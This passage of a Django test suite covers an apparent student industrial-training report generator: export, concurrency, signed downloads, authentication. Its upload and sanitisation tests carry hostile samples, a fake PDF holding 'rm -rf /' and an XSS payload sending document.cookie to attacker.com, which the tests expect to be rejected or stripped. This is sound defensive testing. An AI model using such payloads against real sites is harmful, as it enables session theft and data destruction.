        prov = result["field_provenance"]
        # Explicit RECORDED fields with source page
        self.assertEqual(prov["activity_summary"]["status"], "RECORDED")
        self.assertEqual(prov["activity_summary"]["source_page_id"], 42)
        self.assertEqual(prov["tools_used"]["status"], "RECORDED")

        # Explicit MISSING fields
        self.assertEqual(prov["equipment_used"]["status"], "MISSING")

        # Explicit INFERRED field with stored reasoning
        self.assertEqual(prov["technical_area"]["status"], "INFERRED")
        self.assertIsNotNone(prov["technical_area"]["reasoning"])
        self.assertIn("Inferred", prov["technical_area"]["reasoning"])

        # Supervisor signature status
        self.assertEqual(prov["supervisor_signature"]["status"], "RECORDED")

    def test_date_validation_rules(self):
        from .completeness import validate_training_dates

        # 1. Invalid: Start date >= End date
        inv_res = validate_training_dates(date(2024, 6, 1), date(2024, 5, 1))
        self.assertFalse(inv_res["is_valid"])
        self.assertTrue(any("must be before" in e for e in inv_res["errors"]))

        # 2. Valid date range
        val_res = validate_training_dates(date(2024, 3, 1), date(2024, 8, 31))
        self.assertTrue(val_res["is_valid"])
        self.assertEqual(len(val_res["errors"]), 0)

        # 3. Logbook entry date outside training range produces warning
        entries = [{"entry_date": date(2025, 1, 15)}]
        warn_res = validate_training_dates(date(2024, 3, 1), date(2024, 8, 31), logbook_entries=entries)
        self.assertTrue(warn_res["is_valid"])
        self.assertTrue(any("outside the official training period" in w for w in warn_res["warnings"]))

    def test_completeness_and_generation_block_flow(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # 1. Create a project missing required fields (no address, no end date, no entries)
        incomplete_proj = ReportProject.objects.create(
            user=self.user1,
            title='Incomplete Project',
            full_name='Student Incomplete',
            matric_number='STE/2021/9999',
            department='Computer Engineering',
            university_name='LASUSTECH',
            organization_name='Test Firm Ltd',
            # organization_address missing!
            # training_end_date missing!
            training_start_date=date(2024, 3, 1),
        )

        # 2. Check completeness endpoint
        comp_resp = self.client.get(f'/api/projects/{incomplete_proj.id}/completeness/')
        self.assertEqual(comp_resp.status_code, status.HTTP_200_OK)
        self.assertFalse(comp_resp.data['can_generate'])
        self.assertIn('organisation_address', comp_resp.data['missing_required_fields'])
        self.assertIn('training_duration', comp_resp.data['missing_required_fields'])
        self.assertIn('college', comp_resp.data['missing_required_fields'])
        self.assertIn('degree', comp_resp.data['missing_required_fields'])
        self.assertIn('logbook_entries', comp_resp.data['missing_required_fields'])

        # 3. Attempting report generation must be blocked with HTTP 400
        gen_blocked = self.client.post(f'/api/projects/{incomplete_proj.id}/report/generate/', {})
        self.assertEqual(gen_blocked.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("essential required information is missing", gen_blocked.data['error'])

        # 4. Use targeted missing-info patch endpoint to supply missing fields
        patch_resp = self.client.patch(
            f'/api/projects/{incomplete_proj.id}/missing-info/',
            {
                'organization_address': '12 Marina Street, Lagos Island',
                'training_end_date': '2024-08-30',
            },
            format='json'
        )
        self.assertEqual(patch_resp.status_code, status.HTTP_200_OK)
        incomplete_proj.refresh_from_db()
        self.assertEqual(incomplete_proj.organization_address, '12 Marina Street, Lagos Island')

        # 5. Add a verified logbook entry
        LogbookEntry.objects.create(
            project=incomplete_proj,
            week_number=1,
            day_of_week='Monday',
            raw_text='Orientation and safety briefing',
            verified_text='Orientation and safety briefing',
            activity_summary='Orientation and safety briefing',
            is_verified=True
        )

        # A legacy verified entry is not a confirmed Fact. Thin material and
        # remaining manifest fields must continue to block generation.
        final_completeness = self.client.get(f'/api/projects/{incomplete_proj.id}/completeness/')
        self.assertFalse(final_completeness.data['can_generate'])
        self.assertIn('material_sufficiency', final_completeness.data['missing_required_fields'])
        gen_still_blocked = self.client.post(f'/api/projects/{incomplete_proj.id}/report/generate/', {})
        self.assertEqual(gen_still_blocked.status_code, status.HTTP_400_BAD_REQUEST)

    def test_report_generation_and_section_editing(self):
        # Add a verified logbook entry
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Monday',
            raw_text='Orientation and network cabling',
            verified_text='Orientation and network cabling',
            activity_summary='Orientation and network cabling',
            is_verified=True
        )

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        gen_resp = self.client.post(f'/api/projects/{self.project1.id}/report/generate/', {})
        self.assertEqual(gen_resp.status_code, status.HTTP_200_OK)

        report = self.project1.report
        self.assertIsNotNone(report)
        sections = report.sections.all()
        self.assertGreater(len(sections), 15)

        # Check Chapter 1 background contains university and ITF
        ch1_bg = sections.get(section_key='ch1_background')
        self.assertIn('Industrial Training Fund', ch1_bg.content)
        self.assertIn('LASUSTECH', ch1_bg.content)

        # Edit a section
        ch1_bg_id = ch1_bg.id
        edit_resp = self.client.patch(f'/api/projects/{self.project1.id}/report/sections/{ch1_bg_id}/', {
            'content': '<p>Customized Introduction Paragraph edited by student.</p>'
        })
        self.assertEqual(edit_resp.status_code, status.HTTP_200_OK)
        self.assertTrue(edit_resp.data['last_edited_by_student'])

        # Regenerate report without force_all -> custom section must NOT be overwritten!
        self.client.post(f'/api/projects/{self.project1.id}/report/generate/', {'force_all': False}, format='json')
        ch1_bg.refresh_from_db()
        self.assertIn('Customized Introduction Paragraph edited by student', ch1_bg.content)

    def test_docx_and_pdf_export(self):
        # Generate report first
        generate_full_report(self.project1)

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        
        # Test DOCX export
        docx_resp = self.client.get(f'/api/projects/{self.project1.id}/export/docx/')
        self.assertEqual(docx_resp.status_code, status.HTTP_200_OK)
        self.assertIn('attachment', docx_resp.get('Content-Disposition', ''))

        # Test PDF export with LibreOffice
        pdf_resp = self.client.get(f'/api/projects/{self.project1.id}/export/pdf/')
        self.assertEqual(pdf_resp.status_code, status.HTTP_200_OK)
        self.assertEqual(pdf_resp.get('Content-Type'), 'application/pdf')
        self.assertTrue(pdf_resp.content.startswith(b'%PDF-'))
        self.assertGreater(len(pdf_resp.content), 1000)

        # Check export metadata
        self.project1.refresh_from_db()
        self.assertEqual(self.project1.status, 'exported')
        self.assertIsNotNone(self.project1.report.last_exported_at)

    def test_docx_academic_formatting_sections_and_tables(self):
        report = generate_full_report(self.project1)
        
        # Add a rich section with an academic table to test HTML-to-Docx table conversion
        table_html = (
            "<p>Summary of Hardware Specifications:</p>"
            "<table>"
            "<tr><th>Device Name</th><th>Model</th><th>Function</th></tr>"
            "<tr><td>Edge Router</td><td>Cisco 4331</td><td>WAN Gateway</td></tr>"
            "<tr><td>Core Switch</td><td>Catalyst 3850</td><td>VLAN Distribution</td></tr>"
            "</table>"
        )
        sec = report.sections.filter(chapter_number=3).first()
        if sec:
            sec.content = table_html
            sec.save()

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        docx_resp = self.client.get(f'/api/projects/{self.project1.id}/export/docx/')
        self.assertEqual(docx_resp.status_code, status.HTTP_200_OK)

        # Inspect generated Word document with python-docx
        docx_bytes = b"".join(docx_resp.streaming_content) if hasattr(docx_resp, 'streaming_content') else docx_resp.content
        parsed_doc = docx.Document(io.BytesIO(docx_bytes))

        # Check multi-section structure (Cover, Prelims, Main Body)
        self.assertGreaterEqual(len(parsed_doc.sections), 3)

        # Check binding margin: section 2 and 3 must have 1.5 inch left margin
        body_section = parsed_doc.sections[2]
        self.assertAlmostEqual(body_section.left_margin.inches, 1.5, places=1)
        self.assertAlmostEqual(body_section.right_margin.inches, 1.0, places=1)

        # Check that table was parsed into a real Word table
        self.assertGreaterEqual(len(parsed_doc.tables), 2)
        hardware_tbl = next((t for t in parsed_doc.tables if len(t.rows) == 3), None)
        self.assertIsNotNone(hardware_tbl, "Expected a 3-row hardware table in Word document")
        self.assertEqual(len(hardware_tbl.rows), 3)
        self.assertEqual(len(hardware_tbl.columns), 3)
        self.assertEqual(hardware_tbl.cell(0, 0).text.strip(), "Device Name")
        self.assertEqual(hardware_tbl.cell(1, 0).text.strip(), "Edge Router")
        self.assertEqual(hardware_tbl.cell(2, 1).text.strip(), "Catalyst 3850")

    def test_section_optimistic_concurrency_locking(self):
        generate_full_report(self.project1)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        sec = self.project1.report.sections.first()
        initial_ts = sec.updated_at.isoformat()

        # 1. Update with matching timestamp succeeds
        ok_resp = self.client.patch(
            f'/api/projects/{self.project1.id}/report/sections/{sec.id}/',
            {
                'content': '<p>First legitimate client edit</p>',
                'expected_updated_at': initial_ts
            },
            format='json'
        )
        self.assertEqual(ok_resp.status_code, status.HTTP_200_OK)
        sec.refresh_from_db()

        # 2. Concurrent/stale update using old initial_ts must return HTTP 409 Conflict
        conflict_resp = self.client.patch(
            f'/api/projects/{self.project1.id}/report/sections/{sec.id}/',
            {
                'content': '<p>Conflicting overwrite from tab B</p>',
                'expected_updated_at': initial_ts
            },
            format='json'
        )
        self.assertEqual(conflict_resp.status_code, status.HTTP_409_CONFLICT)
        self.assertTrue(conflict_resp.data.get('conflict'))
        self.assertIn('First legitimate client edit', conflict_resp.data.get('current_content'))

        # 3. Forcing overwrite explicitly resolves conflict
        force_resp = self.client.patch(
            f'/api/projects/{self.project1.id}/report/sections/{sec.id}/',
            {
                'content': '<p>Forced intentional resolution overwrite</p>',
                'expected_updated_at': initial_ts,
                'force_overwrite': True
            },
            format='json'
        )
        self.assertEqual(force_resp.status_code, status.HTTP_200_OK)
        sec.refresh_from_db()
        self.assertIn('Forced intentional resolution overwrite', sec.content)

    def test_async_export_status_and_signed_download(self):
        generate_full_report(self.project1)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # 1. Query export status with trigger=true
        status_resp = self.client.get(
            f'/api/projects/{self.project1.id}/export/status/?format=docx&trigger=true'
        )
        self.assertEqual(status_resp.status_code, status.HTTP_200_OK, getattr(status_resp, 'data', status_resp.content))
        self.assertIn(status_resp.data['status'], ['ready', 'processing'])

        # Generate DOCX to ensure file is ready
        generate_docx_report(self.project1.report)

        # 2. Query status again -> ready with signed download URL
        status_resp2 = self.client.get(
            f'/api/projects/{self.project1.id}/export/status/?format=docx'
        )
        self.assertEqual(status_resp2.status_code, status.HTTP_200_OK)
        self.assertEqual(status_resp2.data['status'], 'ready')
        self.assertIsNotNone(status_resp2.data['download_url'])
        download_url = status_resp2.data['download_url']

        # 3. Unauthenticated client with signed URL can download
        anon_client = APIClient()
        dl_resp = anon_client.get(download_url)
        self.assertEqual(dl_resp.status_code, status.HTTP_200_OK)
        self.assertIn('attachment', dl_resp.get('Content-Disposition', ''))

        # 4. Tampered token returns 403 Forbidden
        tampered_url = download_url + "tampered"
        tampered_resp = anon_client.get(tampered_url)
        self.assertEqual(tampered_resp.status_code, status.HTTP_403_FORBIDDEN)

        # 5. User2 cannot access User1's export status or download
        user2_client = APIClient()
        login2 = user2_client.post('/api/auth/login/', {'username': 'student2', 'password': 'StrongPassword123!'})
        user2_client.credentials(HTTP_AUTHORIZATION=f"Bearer {login2.data['access']}")
        u2_resp = user2_client.get(f'/api/projects/{self.project1.id}/export/status/?format=docx')
        self.assertEqual(u2_resp.status_code, status.HTTP_404_NOT_FOUND)

    def test_template_version_pinning_immutability(self):
        # 1. Add verified logbook entry and generate report
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Monday',
            raw_text='Configured network router',
            verified_text='Configured network router',
            activity_summary='Configured network router',
            is_verified=True
        )
        report = generate_full_report(self.project1)

        # Verify initial pinning
        self.assertEqual(report.template_version, 'lasustech-standard:1.0.0')
        self.assertEqual(report.template_snapshot['template_id'], 'lasustech-standard')
        self.assertEqual(report.template_snapshot['version'], '1.0.0')
        self.assertEqual(report.template_snapshot['name'], 'LASUSTECH Standard SIWES Technical Report Template')

        # 2. Mutate database template row to simulate template upgrade
        tmpl = report.template
        if tmpl:
            tmpl.name = 'LASUSTECH Upgraded 2027 Format'
            tmpl.version = '2.0.0'
            tmpl.save()

        # 3. Reload report and re-run generation or section update
        report.refresh_from_db()
        # Pinned version and snapshot on previously generated report must NEVER change!
        self.assertEqual(report.template_version, 'lasustech-standard:1.0.0')
        self.assertEqual(report.template_snapshot['name'], 'LASUSTECH Standard SIWES Technical Report Template')
        self.assertEqual(report.template_snapshot['version'], '1.0.0')

    def test_v1_section_content_is_identical_on_regeneration(self):
        with patch('api.report_generator.is_ai_available', return_value=False):
            first = generate_full_report(self.project1)
            before = list(first.sections.order_by('chapter_number', 'order', 'id').values_list(
                'section_key', 'chapter_number', 'title', 'content', 'order'
            ))
            second = generate_full_report(self.project1)
            after = list(second.sections.order_by('chapter_number', 'order', 'id').values_list(
                'section_key', 'chapter_number', 'title', 'content', 'order'
            ))
        self.assertEqual(second.template_version, 'lasustech-standard:1.0.0')
        self.assertEqual(before, after)

    def test_no_source_material_flagged_not_invented(self):
        # Create a project with empty optional and narrative fields
        sparse_proj = ReportProject.objects.create(
            user=self.user1,
            title='Sparse Logbook Project',
            full_name='Test Student',
            matric_number='STE/2021/0001',
            department='Computer Engineering',
            university_name='LASUSTECH',
            organization_name='Acme Systems Ltd',
            organization_address='5 Broad Street, Lagos Island',
            training_start_date=date(2024, 3, 1),
            training_end_date=date(2024, 8, 31),
            organization_activities='',
            tasks_performed='',
            projects_undertaken='',
            problems_encountered='',
            skills_acquired='',
        )
        LogbookEntry.objects.create(
            project=sparse_proj,
            week_number=1,
            day_of_week='Monday',
            raw_text='Attended morning briefing',
            verified_text='Attended morning briefing',
            activity_summary='Attended morning briefing',
            is_verified=True
        )

        report = generate_full_report(sparse_proj)

        self.assertEqual(report.template_version, 'lasustech_cs:2.0.0')
        self.assertEqual({s.chapter_number for s in report.sections.filter(chapter_number__gt=0).exclude(section_key='references')}, {1, 2, 3, 4})
        all_content = '\n'.join(s.content for s in report.sections.all())
        for invented in ('Engineering / IT Unit', 'Standard toolkit', 'Mika Labs', '[INPUT NEEDED', '[Student'):
            self.assertNotIn(invented, all_content)
        self.assertEqual(report.sections.get(section_key='ch2_history').content, '')
        self.assertEqual(report.sections.get(section_key='ch3_skills').content, '')
        self.assertEqual(report.sections.get(section_key='ch3_activities').content, '')
        self.assertTrue(report.page_estimate_breakdown['informational_only'])
        self.assertIn('student_derived_words', report.page_estimate_breakdown)

    def test_v2_docx_uses_four_chapters_and_configured_format(self):
        project = ReportProject.objects.create(
            user=self.user1,
            full_name='Ada Example',
            matric_number='SYN/0001',
            department='Computer Science',
            college='',
            degree='Bachelor of Science',
            organization_name='Example Systems Ltd',
            organization_address='Lagos, Nigeria',
            placement_department='Software Unit',
            training_start_date=date(2026, 1, 5),
            training_end_date=date(2026, 4, 3),
            tools_used='Python',
            skills_acquired='Python programming',
            problems_encountered='A test environment could not reach the package registry.',
        )
        LogbookEntry.objects.create(
            project=project, week_number=3, activity_summary='Created a small Python script.',
            verified_text='Created a small Python script.', tools_used='Python', is_verified=True,
        )
        from .completeness import check_project_completeness
        profile_check = check_project_completeness(project)
        self.assertIn('college', profile_check['missing_required_fields'])
        self.assertNotIn('degree', profile_check['missing_required_fields'])
        report = generate_full_report(project)
        self.assertEqual(report.template_version, 'lasustech_cs:2.0.0')
        section_check = check_project_completeness(project)
        self.assertIn('section:ch2_history', section_check['missing_required_fields'])
        doc = docx.Document(generate_docx_report(report))
        text = '\n'.join(paragraph.text for paragraph in doc.paragraphs)
        self.assertIn('CHAPTER ONE\nINTRODUCTION', text)
        self.assertIn('CHAPTER FOUR\nSUMMARY, CONCLUSION AND RECOMMENDATIONS', text)
        self.assertNotIn('CHAPTER FIVE', text)
        self.assertIn('Industrial-Based Supervisor', text)
        self.assertIn('SIWES Coordinator - Computer Science', text)
        self.assertIn('HOD, Computer Science', text)
        self.assertIn('DATE:', text)
        self.assertNotIn('[INPUT NEEDED', text)
        self.assertIn('TOC', doc._element.xml)
        section_xml = '\n'.join(section._sectPr.xml for section in doc.sections)
        self.assertIn('w:fmt="lowerRoman"', section_xml)
        self.assertIn('w:fmt="decimal"', section_xml)
        self.assertIn('w:start="1"', section_xml)
        self.assertTrue(any('Page ' in paragraph.text for section in doc.sections for paragraph in section.footer.paragraphs))
        for paragraph in doc.paragraphs:
            for run in paragraph.runs:
                if run.text.strip():
                    self.assertEqual(run.font.name, 'Times New Roman')

    def test_generated_report_structure_snapshot(self):
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Monday',
            raw_text='Configured router interface',
            verified_text='Configured router interface',
            activity_summary='Configured router interface',
            is_verified=True
        )
        report = generate_full_report(self.project1)
        sections = list(report.sections.all().order_by('chapter_number', 'order', 'id'))

        expected_sequence = [
            # Prelims (Ch 0)
            ('cover', 0),
            ('title_page', 0),
            ('declaration', 0),
            ('certification', 0),
            ('dedication', 0),
            ('acknowledgements', 0),
            ('abstract', 0),
            ('table_of_contents', 0),
            # Chapter 1
            ('ch1_background', 1),
            ('ch1_objectives', 1),
            ('ch1_scope', 1),
            # Chapter 2
            ('ch2_org_profile', 2),
            ('ch2_org_structure', 2),
            ('ch2_placement_unit', 2),
            # Chapter 3
            ('ch3_training_env', 3),
            ('ch3_tools', 3),
            ('ch3_weekly_log', 3),
            ('ch3_technical_procedures', 3),
            ('ch3_projects', 3),
            # Chapter 4
            ('ch4_skills', 4),
            ('ch4_challenges', 4),
            ('ch4_solutions', 4),
            ('ch4_lessons', 4),
            # Chapter 5
            ('ch5_summary', 5),
            ('ch5_objectives_achievement', 5),
            ('ch5_recommendations', 5),
            # Back Matter (Ch 6)
            ('references', 6),
            ('appendices', 6),
        ]

        actual_sequence = [(s.section_key, s.chapter_number) for s in sections]
        self.assertEqual(actual_sequence, expected_sequence)

    def test_docx_multi_section_pagination_and_formatting(self):
        from .document_exporter import generate_docx_report
        import docx
        from docx.shared import Inches, Pt

        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Monday',
            raw_text='Terminated fiber cable',
            verified_text='Terminated fiber cable',
            activity_summary='Terminated fiber cable',
            is_verified=True
        )
        report = generate_full_report(self.project1)
        docx_path = generate_docx_report(report)

        self.assertTrue(os.path.exists(docx_path))
        doc = docx.Document(docx_path)

        # 1. Multi-section document structure: Cover (0), Prelims (1), Main Body (2)
        self.assertGreaterEqual(len(doc.sections), 3)

        # Section 0 (Cover): no visible page number on first page
        sec_cover = doc.sections[0]
        self.assertTrue(sec_cover.different_first_page_header_footer)
        self.assertEqual(sec_cover.left_margin, Inches(1.5))
        self.assertEqual(sec_cover.right_margin, Inches(1.0))
        self.assertEqual(sec_cover.top_margin, Inches(1.0))
        self.assertEqual(sec_cover.bottom_margin, Inches(1.0))

        # Section 1 (Prelims): Lowercase Roman numerals
        sec_prelim = doc.sections[1]
        self.assertEqual(sec_prelim.left_margin, Inches(1.5))
        xml_prelim = sec_prelim._sectPr.xml
        self.assertIn('lowerRoman', xml_prelim)

        # Section 2 (Body): Decimal Arabic numerals starting at 1
        sec_body = doc.sections[2]
        self.assertEqual(sec_body.left_margin, Inches(1.5))
        xml_body = sec_body._sectPr.xml
        self.assertIn('decimal', xml_body)
        self.assertIn('w:start="1"', xml_body)

        # 2. Typography: Times New Roman, 12pt
        normal_style = doc.styles['Normal']
        self.assertEqual(normal_style.font.name, 'Times New Roman')
        self.assertEqual(normal_style.font.size, Pt(12))

        # 3. Table of Contents rendered in document
        full_text = " ".join([p.text for p in doc.paragraphs])
        self.assertIn('TABLE OF CONTENTS', full_text)
        self.assertIn('CHAPTER ONE: INTRODUCTION', full_text)

    @patch('api.feature_flags.is_feature_enabled', return_value=True)
    def test_defence_questions_generation_and_mastery(self, mock_flags):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        
        # Generate defence questions
        gen_resp = self.client.post(f'/api/projects/{self.project1.id}/defence/generate/', {})
        self.assertEqual(gen_resp.status_code, status.HTTP_200_OK)
        self.assertGreaterEqual(len(gen_resp.data), 12)

        # Check questions list
        list_resp = self.client.get(f'/api/projects/{self.project1.id}/defence/questions/')
        self.assertEqual(list_resp.status_code, status.HTTP_200_OK)
        first_q = list_resp.data[0]
        q_id = first_q['id']

        # Update question mastery status to 'confident' and flag
        patch_resp = self.client.patch(f'/api/projects/{self.project1.id}/defence/questions/{q_id}/', {
            'mastery_status': 'confident',
            'is_flagged_hard': True
        })
        self.assertEqual(patch_resp.status_code, status.HTTP_200_OK)
        self.assertEqual(patch_resp.data['mastery_status'], 'confident')
        self.assertTrue(patch_resp.data['is_flagged_hard'])

        # Record defence session
        session_resp = self.client.post(f'/api/projects/{self.project1.id}/defence/session/', {
            'questions_attempted': 5,
            'confident_count': 4,
            'needs_practice_count': 1,
            'notes': 'Prepared well for NOC networking questions.'
        })
        self.assertEqual(session_resp.status_code, status.HTTP_201_CREATED)

    def test_swagger_docs_and_schema_endpoints(self):
        # Anonymous client can access OpenAPI schema and Swagger documentation at /docs
        anon_client = APIClient()
        schema_resp = anon_client.get('/api/schema/')
        self.assertEqual(schema_resp.status_code, status.HTTP_200_OK)

        docs_resp = anon_client.get('/docs/')
        self.assertEqual(docs_resp.status_code, status.HTTP_200_OK)
        self.assertIn(b'swagger-ui', docs_resp.content.lower())

    def test_magic_byte_validation_rejects_spoofed_files(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        # Disguised executable/bash script claiming to be a PDF
        spoofed_file = SimpleUploadedFile(
            'malicious.pdf',
            b'#!/bin/bash\necho "Attacking system..."\nrm -rf /',
            content_type='application/pdf'
        )
        resp = self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': spoofed_file}, format='multipart')
        self.assertEqual(resp.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('does not match allowed document types', resp.data['error'])

    def test_xss_sanitization_in_section_update(self):
        generate_full_report(self.project1)
        section = self.project1.report.sections.first()
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        malicious_payload = (
            "<p>Valid academic summary.</p>"
            "<script>alert('xss_attack');</script>"
            "<img src='invalid.jpg' onerror='fetch(\"http://attacker.com?c=\"+document.cookie)' />"
            "<a href='javascript:alert(1)'>Click me</a>"
        )
        resp = self.client.patch(f'/api/projects/{self.project1.id}/report/sections/{section.id}/', {
            'content': malicious_payload
        })
        self.assertEqual(resp.status_code, status.HTTP_200_OK)
        section.refresh_from_db()

        # Verify <script>, onerror, and javascript: were completely stripped
        self.assertNotIn('<script>', section.content)
        self.assertNotIn('onerror', section.content)
        self.assertNotIn('javascript:', section.content)
        self.assertIn('<p>Valid academic summary.</p>', section.content)

    def test_authenticated_source_document_download_and_isolation(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        # Upload valid PDF
        valid_pdf_content = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
        pdf_file = SimpleUploadedFile('logbook.pdf', valid_pdf_content, content_type='application/pdf')
        upload_resp = self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': pdf_file}, format='multipart')
        self.assertEqual(upload_resp.status_code, status.HTTP_201_CREATED)
        doc_id = upload_resp.data['id']

        # 1. User 1 (owner) can download
        download_resp = self.client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
        self.assertEqual(download_resp.status_code, status.HTTP_200_OK)
        self.assertIn('attachment', download_resp.get('Content-Disposition', ''))

        # 2. User 2 (unauthorized student) cannot download User 1's document
        user2_login = self.client.post('/api/auth/login/', {'username': 'student2', 'password': 'StrongPassword123!'})
        token2 = user2_login.data['access']
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token2}')
        forbidden_resp = self.client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
        self.assertEqual(forbidden_resp.status_code, status.HTTP_404_NOT_FOUND)

        # 3. Anonymous user cannot download
        anon_client = APIClient()
        anon_resp = anon_client.get(f'/api/projects/{self.project1.id}/documents/{doc_id}/download/')
        self.assertEqual(anon_resp.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_cascade_filesystem_cleanup_on_project_delete(self):
        from django.conf import settings
        from pathlib import Path

        # Upload a document to create files in project directory
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        valid_pdf = SimpleUploadedFile('sample.pdf', b"%PDF-1.4\nsample data\n%%EOF", content_type='application/pdf')
        self.client.post(f'/api/projects/{self.project1.id}/documents/', {'file': valid_pdf}, format='multipart')

        project_dir = Path(settings.MEDIA_ROOT) / "projects" / str(self.project1.id)
        self.assertTrue(project_dir.exists())

        # Delete project via API
        del_resp = self.client.delete(f'/api/projects/{self.project1.id}/')
        self.assertEqual(del_resp.status_code, status.HTTP_204_NO_CONTENT)

        # Confirm on-disk directory was cascade-removed
        self.assertFalse(project_dir.exists())

    def test_logbook_and_defence_filtering(self):
        # Create logbook entries across weeks 1 and 2
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Monday',
            activity_summary='Orientation and safety induction',
            is_verified=True
        )
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=1,
            day_of_week='Tuesday',
            activity_summary='Rack cabling review',
            is_verified=False
        )
        LogbookEntry.objects.create(
            project=self.project1,
            week_number=2,
            day_of_week='Monday',
            activity_summary='Router VLAN configuration',
            is_verified=True
        )

        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # Filter by week=1
        resp_week1 = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?week=1')
        self.assertEqual(resp_week1.status_code, status.HTTP_200_OK)
        self.assertEqual(len(resp_week1.data), 2)

        # Filter by verified=true
        resp_ver = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?verified=true')
        self.assertEqual(resp_ver.status_code, status.HTTP_200_OK)
        self.assertEqual(len(resp_ver.data), 2)

        # Filter by week=1 and verified=true
        resp_w1_ver = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/?week=1&verified=true')
        self.assertEqual(resp_w1_ver.status_code, status.HTTP_200_OK)
        self.assertEqual(len(resp_w1_ver.data), 1)
        self.assertEqual(resp_w1_ver.data[0]['day_of_week'], 'Monday')

    def test_registration_without_username_and_email_uniqueness(self):
        # Student registers using full_name and email without specifying username
        resp = self.client.post('/api/auth/register/', {
            'full_name': 'Ayomide Adeleke',
            'email': 'ayomide.adeleke@lasustech.edu.ng',
            'password': 'StrongPassword2026!',
            'password_confirm': 'StrongPassword2026!'
        })
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertIn('tokens', resp.data)
        user_data = resp.data['user']
        self.assertEqual(user_data['first_name'], 'Ayomide')
        self.assertEqual(user_data['last_name'], 'Adeleke')
        self.assertTrue(user_data['username'].startswith('ayomide_adeleke'))

        # Duplicate email registration must be rejected
        dup_resp = self.client.post('/api/auth/register/', {
            'full_name': 'Another Ayomide',
            'email': 'AYOMIDE.ADELEKE@lasustech.edu.ng',
            'password': 'AnotherPassword2026!',
            'password_confirm': 'AnotherPassword2026!'
        })
        self.assertEqual(dup_resp.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('email', dup_resp.data)

    def test_login_with_email_address(self):
        # Student logs in providing email instead of username
        resp = self.client.post('/api/auth/login/', {
            'username': 'student1@lasustech.edu.ng',
            'password': 'StrongPassword123!'
        })
        self.assertEqual(resp.status_code, status.HTTP_200_OK)
        self.assertIn('access', resp.data)
        self.assertIn('refresh', resp.data)
        self.assertEqual(resp.data['user']['email'], 'student1@lasustech.edu.ng')

    def test_password_reset_flow(self):
        # 1. Request password reset
        req_resp = self.client.post('/api/auth/password-reset/', {
            'email': 'student2@lasustech.edu.ng'
        })
        self.assertEqual(req_resp.status_code, status.HTTP_200_OK)
        self.assertIn('reset_token', req_resp.data)
        reset_token = req_resp.data['reset_token']

        # 2. Confirm reset with new password
        confirm_resp = self.client.post('/api/auth/password-reset/confirm/', {
            'token': reset_token,
            'password': 'BrandNewPassword2026!',
            'password_confirm': 'BrandNewPassword2026!'
        })
        self.assertEqual(confirm_resp.status_code, status.HTTP_200_OK)

        # 3. Old password fails
        old_login = self.client.post('/api/auth/login/', {
            'username': 'student2',
            'password': 'StrongPassword123!'
        })
        self.assertEqual(old_login.status_code, status.HTTP_401_UNAUTHORIZED)

        # 4. New password succeeds
        new_login = self.client.post('/api/auth/login/', {
            'username': 'student2@lasustech.edu.ng',
            'password': 'BrandNewPassword2026!'
        })
        self.assertEqual(new_login.status_code, status.HTTP_200_OK)

        # 5. Token reuse must fail
        reuse_resp = self.client.post('/api/auth/password-reset/confirm/', {
            'token': reset_token,
            'password': 'YetAnotherPassword2026!',
            'password_confirm': 'YetAnotherPassword2026!'
        })
        self.assertEqual(reuse_resp.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('token', reuse_resp.data)

    def test_password_reset_invalid_token(self):
        resp = self.client.post('/api/auth/password-reset/confirm/', {
            'token': 'invalid:token:12345',
            'password': 'BrandNewPassword2026!',
            'password_confirm': 'BrandNewPassword2026!'
        })
        self.assertEqual(resp.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('token', resp.data)

    def test_feature_flags_endpoint_and_defaults(self):
        # Anonymous client can fetch feature flags
        anon_client = APIClient()
        resp = anon_client.get('/api/config/flags/')
        self.assertEqual(resp.status_code, status.HTTP_200_OK)

        data = resp.data
        # Ensure all 22 required flags are present
        for flag_name, expected_val in DEFAULT_FEATURE_FLAGS.items():
            self.assertIn(flag_name, data, f"Missing flag: {flag_name}")
            self.assertEqual(data[flag_name], expected_val, f"Flag {flag_name} mismatch")

        # Confirm critical out-of-scope flags are OFF by default
        self.assertFalse(data['defence_preparation'])
        self.assertFalse(data['slide_generation'])
        self.assertFalse(data['payment_processing'])
        self.assertFalse(data['print_fulfilment'])
        self.assertFalse(data['delivery_management'])
        self.assertFalse(data['supervisor_portal'])
        self.assertFalse(data['institution_management'])
